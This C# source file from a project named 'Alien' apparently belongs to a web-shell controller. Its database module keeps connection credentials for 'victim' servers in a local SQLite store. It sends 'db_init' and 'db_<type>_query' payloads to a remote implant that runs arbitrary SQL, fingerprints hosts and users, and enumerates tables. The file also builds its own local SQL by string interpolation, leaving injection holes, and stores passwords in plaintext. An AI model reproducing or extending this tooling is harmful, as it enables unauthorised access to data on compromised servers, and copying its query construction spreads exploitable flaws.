using System.Data;
using System.Data.SQLite;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace Alien
{
    public class clsfnDb : clsfnBase
    {
        private clsWeb m_web { get; set; }

        public string m_szConnString { get; set; }
        public clsSqlite m_sqlConn { get; set; }

        private string m_szDbFileName { get; set; }
        private string m_szDbDirectory { get; set; }
        private string m_szDbFilePath { get { return Path.Combine(m_szDbDirectory, m_szDbFileName); } }

        private Dictionary<string, string[]> m_dicTable = new Dictionary<string, string[]>()
        {
            {
                "Database",
                new string[]
                {
                    "ID",
                    "DbType",
                    "ConnString",
                    "Source",
                    "Username",
                    "Password",
                    "CreationDate",
                    "LastUsed",
                }
            },
            {
                "Logs",
                new string[]
                {
                    "MsgType",
                    "Message",
                    "CreationDate",
                }
            }
        };
        private Dictionary<enDatabase, string> m_dicInfoSQL = new Dictionary<enDatabase, string>()
        {
            {
                enDatabase.MySQL,
                @"SELECT
                    @@hostname AS host,
                    @@port AS port,
                    VERSION() AS version,
                    DATABASE() AS current_database,
                    USER() AS connected_user,
                    CURRENT_USER() AS authenticated_user;"
            },
            {
                enDatabase.Access,
                @""
            },
            {
                enDatabase.SQLServer,
                @"SELECT
                    @@SERVERNAME AS server_name,
                    SERVERPROPERTY('MachineName') AS machine_name,
                    SERVERPROPERTY('InstanceName') AS instance_name,
                    @@VERSION AS version,
                    DB_NAME() AS current_database,
                    SYSTEM_USER AS current_user;"
            },
            {
                enDatabase.PostgreSQL,
                @"SELECT
                    inet_server_addr() AS server_ip,
                    inet_server_port() AS server_port,
                    version() AS version,
                    current_database() AS current_database,
                    current_user AS current_user;"
            },
            {
                enDatabase.SQLite,
                @"SELECT sqlite_version() AS version;"
            },
            {
                enDatabase.Oracle,
                @"SELECT
                    i.host_name,
                    i.instance_name,
                    i.version,
                    d.name AS database_name,
                    USER AS current_user
                FROM v$instance i
                CROSS JOIN v$database d;"
            },
            {
                enDatabase.DSN,
                @""
            }
        };

        public Dictionary<string, stDbConfig> m_stDbConfig = new Dictionary<string, stDbConfig>();

        public struct stDbConfig
        {
            public string szID { get; set; }

            public enDatabase enDbType { get; set; }

            public string szSource { get; set; }
            public string szUsername { get; set; }
            public string szPassword { get; set; }
            public string szConnString { get; set; }

            public DateTime dtCreationDate { get; set; }
            public DateTime dtLastUsed { get; set; }
        }

        public clsfnDb(clsWeb web, string szDbFileName)
        {
            m_web = web;
            m_szDbFileName = szDbFileName;

            m_szDbDirectory = Path.Combine(web.m_victim.m_szPortfolio, "Database");
            if (!Directory.Exists(m_szDbDirectory))
                Directory.CreateDirectory(m_szDbDirectory);

            m_sqlConn = new clsSqlite(m_szDbFilePath, m_dicTable);
        }

        public class clsQueryResponse
        {
            public bool success { get; set; }
            public int rowCount { get; set; }
            public List<Dictionary<string, object>> data { get; set; }
            public string error { get; set; }
        }

        #region Local Function

        public bool fnbDbExists(string szSource)
        {
            string szQuery = "SELECT EXISTS(SELECT 1 FROM \"Database\" WHERE \"Source\" = @src);";

            using var cmd = new SQLiteCommand(szQuery, m_sqlConn.m_sqlConn);
            cmd.Parameters.AddWithValue("@src", szSource);

            object result = cmd.ExecuteScalar();

            return Convert.ToInt32(result) == 1;
        }

        private bool fnbDbWriteValidate(stDbConfig config)
        {
            if (!fnbDbExists(config.szSource))
                return false;

            stDbConfig x = fnGetDbConfig(config.szID);

            bool bRet = string.Equals(x.szID, config.szID, StringComparison.Ordinal)
                && string.Equals(x.szConnString, config.szConnString, StringComparison.Ordinal)
                && string.Equals(x.szSource, config.szSource, StringComparison.Ordinal)
                && string.Equals(x.szUsername, config.szUsername, StringComparison.Ordinal)
                && string.Equals(x.szPassword, config.szPassword, StringComparison.Ordinal);

            return bRet;
        }

        public bool fnbSaveDatabase(stDbConfig config)
        {
            string szQuery = string.Empty;
            if (fnbDbExists(config.szSource))
            {
                DialogResult dr = MessageBox.Show("Database config is existed, do you want to replace it?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (dr != DialogResult.Yes)
                    return false;

                szQuery = $"UPDATE \"Database\" SET " +
                    $"\"DbType\" = \"{Enum.GetName(typeof(enDatabase), config.enDbType)}\"," +
                    $"\"ConnString\" = \"{config.szConnString}\"," +
                    $"\"Source\" = \"{config.szSource}\"," +
                    $"\"Username\" = \"{config.szUsername}\"," +
                    $"\"Password\" = \"{config.szPassword}\"," +
                    $"\"CreationDate\" = \"{config.dtCreationDate.ToString("F")}\"," +
                    $"\"LastUsed\" = \"{config.dtLastUsed.ToString("F")}\" " +
                    $"WHERE \"ID\" = \"{config.szID}\";";
            }
            else
            {
                szQuery = $"INSERT INTO Database(" +
                    $"\"ID\"," +
                    $"\"DbType\"," +
                    $"\"ConnString\"," +
                    $"\"Source\"," +
                    $"\"Username\"," +
                    $"\"Password\"," +
                    $"\"CreationDate\"," +
                    $"\"LastUsed\"" +
                    $") VALUES(" +
                    $"\"{config.szID}\"," +
                    $"\"{Enum.GetName(config.enDbType)}\"," +
                    $"\"{config.szConnString}\"," +
                    $"\"{config.szSource}\"," +
                    $"\"{config.szUsername}\"," +
                    $"\"{config.szPassword}\"," +
                    $"\"{config.dtCreationDate.ToString("F")}\"," +
                    $"\"{config.dtLastUsed.ToString("F")}\"" +
                    $");";
            }

            clsTool.fnSqlQuery(m_sqlConn.m_sqlConn, szQuery);

            return fnbDbWriteValidate(config);
        }

        public stDbConfig fnGetDbConfig(string szId)
        {
            var ls = fnGetAllDbConfig();
            stDbConfig config = ls.Where(x => string.Equals(x.szID, szId)).ToList().First();

            return config;
        }

        public List<stDbConfig> fnGetAllDbConfig()
        {
            List<stDbConfig> ls = new List<stDbConfig>();

            string szQuery = $"SELECT * FROM \"Database\";";
            DataTable dt = clsTool.fnSqlQuery(m_sqlConn.m_sqlConn, szQuery);
            foreach (DataRow dr in dt.Rows)
            {
                string szID = (string)dr["ID"];
                enDatabase enDb = (enDatabase)Enum.Parse(typeof(enDatabase), (string)dr["DbType"]);
                string szConnStr = (string)dr["ConnString"];
                string szSource = (string)dr["Source"];
                string szUsername = (string)dr["Username"];
                string szPassword = (string)dr["Password"];
                DateTime dtCreation = DateTime.Parse((string)dr["CreationDate"]);
                DateTime dtLastUsed = DateTime.Parse((string)dr["LastUsed"]);

                stDbConfig config = new stDbConfig()
                {
                    szID = szID,

                    enDbType = enDb,

                    szSource = szSource,
                    szConnString = szConnStr,
                    szUsername = szUsername,
                    szPassword = szPassword,

                    dtCreationDate = dtCreation,
                    dtLastUsed = dtLastUsed,
                };

                ls.Add(config);

                if (!m_stDbConfig.ContainsKey(szSource))
                    m_stDbConfig.Add(szSource, config);
            }

            return ls;
        }

        public bool fnbDbDelete(stDbConfig config)
        {
            if (!fnbDbExists(config.szSource))
            {
                MessageBox.Show($"Cannot find database: {config.szSource}", "Not found!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }

            string szQuery = $"DELETE FROM Database WHERE ID=\"{config.szID}\";";
            var cmd = clsTool.fnSqlQuery(m_sqlConn.m_sqlConn, szQuery);

            bool bVerify = !fnbDbExists(config.szSource);

            return bVerify;
        }

        #endregion

        #region Tools

        public static string fnBuildConnStr(stDbConfig cfg)
        {
            switch (cfg.enDbType)
            {
                case enDatabase.DSN:
                    return string.IsNullOrWhiteSpace(cfg.szUsername)
                        ? $"DSN={cfg.szSource};"
                        : $"DSN={cfg.szSource};UID={cfg.szUsername};PWD={cfg.szPassword};";

                case enDatabase.MySQL:
                    return
                        $"Server={cfg.szSource};" +
                        $"Database=information_schema;" +
                        $"Uid={cfg.szUsername};" +
                        $"Pwd={cfg.szPassword};";

                case enDatabase.SQLServer:
                    return string.IsNullOrWhiteSpace(cfg.szUsername)
                        ? $"Server={cfg.szSource};Database=master;Trusted_Connection=True;"
                        : $"Server={cfg.szSource};Database=master;User Id={cfg.szUsername};Password={cfg.szPassword};";

                case enDatabase.PostgreSQL:
                    return
                        $"Host={cfg.szSource};" +
                        $"Database=postgres;" +
                        $"Username={cfg.szUsername};" +
                        $"Password={cfg.szPassword};";

                case enDatabase.SQLite:
                    return $"Data Source={cfg.szSource};";

                case enDatabase.ODBC:
                    return cfg.szSource;

                case enDatabase.Access:
                    return
                        $"Driver={{Microsoft Access Driver (*.mdb, *.accdb)}};" +
                        $"Dbq={cfg.szSource};";

                case enDatabase.Oracle:
                    return
                        $"User Id={cfg.szUsername};" +
                        $"Password={cfg.szPassword};" +
                        $"Data Source={cfg.szSource};";

                default:
                    throw new NotSupportedException(
                        $"Unsupported database type: {cfg.enDbType}");
            }
        }

        public string fnToSingleLineSql(string szSQL)
        {
            if (string.IsNullOrEmpty(szSQL))
                return szSQL;

            bool inSingleQuote = false;
            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < szSQL.Length; i++)
            {
                char c = szSQL[i];

                if (c == '\'')
                    inSingleQuote = !inSingleQuote;

                if (!inSingleQuote)
                {
                    if (c == '\r' || c == '\n' || c == '\t')
                        c = ' ';
                }

                sb.Append(c);
            }

            return Regex.Replace(sb.ToString(), @"[ ]{2,}", " ").Trim();
        }

        #endregion

        #region Remote Function

        public async Task<List<(string, bool)>> fnDbInit()
        {
            string szContent = await m_web.fnszSendPayload("db_init");
            List<(string, bool)> result = szContent.Trim('\n').Trim('\r').Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => x.Split(':')).Select(x => (x.First(), Equals(x.Last(), "1"))).ToList();

            return result;
        }

        private DataTable fnConvertToTable(List<Dictionary<string, object>> objData)
        {
            DataTable dt = new DataTable();
            if (objData == null || objData.Count == 0)
                return dt;

            foreach (var key in objData.First().Keys)
                dt.Columns.Add(key);

            foreach (var dict in objData)
            {
                DataRow dr = dt.NewRow();
                foreach (var key in dict.Keys)
                    dr[key] = dict[key]?.ToString();

                dt.Rows.Add(dr);
            }

            return dt;
        }

        public async Task<string> fnszSqlExec(stDbConfig config, string szQuery)
        {
            string? szDb = Enum.GetName(typeof(enDatabase), config.enDbType);
            if (string.IsNullOrEmpty(szDb))
            {
                MessageBox.Show("Parse language enumerator error.");
                return string.Empty;
            }

            string szPayload = $"db_{szDb.ToLower()}_query";
            string szResp = await m_web.fnszSendPayload(szPayload, new string[]
            {
                config.szConnString,
                szQuery,
            });

            return szResp;
        }

        public async Task<DataTable> fnSqlQuery(stDbConfig config, string szQuery)
        {
            DataTable dt = new DataTable();
            string szResp = await fnszSqlExec(config, szQuery);

            //MessageBox.Show(szResp);

            clsQueryResponse? result = JsonSerializer.Deserialize<clsQueryResponse>(szResp);
            if (result == null)
                return dt;

            if (!result.success)
            {
                MessageBox.Show(result.error, "SQL query error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return dt;
            }

            dt = fnConvertToTable(result.data);

            return dt;
        }

        public async Task<bool> fnDbTest(stDbConfig config)
        {
            string szQuery = "SELECT 1;";
            DataTable dt = await fnSqlQuery(config, szQuery);

            return dt.Rows.Count > 0 && dt.Columns.Count > 0 && Convert.ToInt32(dt.Rows[0][0]) == 1;
        }

        public async Task<DataTable> fnDbInfo(stDbConfig config)
        {
            DataTable dt = new DataTable();
            string szQuery = m_dicInfoSQL[config.enDbType];

            if (string.IsNullOrEmpty(szQuery))
                return dt;
            
            szQuery = fnToSingleLineSql(szQuery);
            dt = await fnSqlQuery(config, szQuery);

            return dt;
        }

        public async Task<List<string>> fnDbGetTables(stDbConfig config, string szDbName)
        {
            string szQuery = $"SELECT table_name FROM information_schema.tables WHERE table_schema = '{szDbName}';";
            DataTable dt = await fnSqlQuery(config, szQuery);

            List<string> lsTable = new List<string>();
            foreach (DataRow dr in dt.Rows)
            {
                string? szTable = dr[0].ToString();
                if (string.IsNullOrEmpty(szTable))
                    continue;

                lsTable.Add(szTable);
            }

            return lsTable;
        }

        #endregion
    }
}
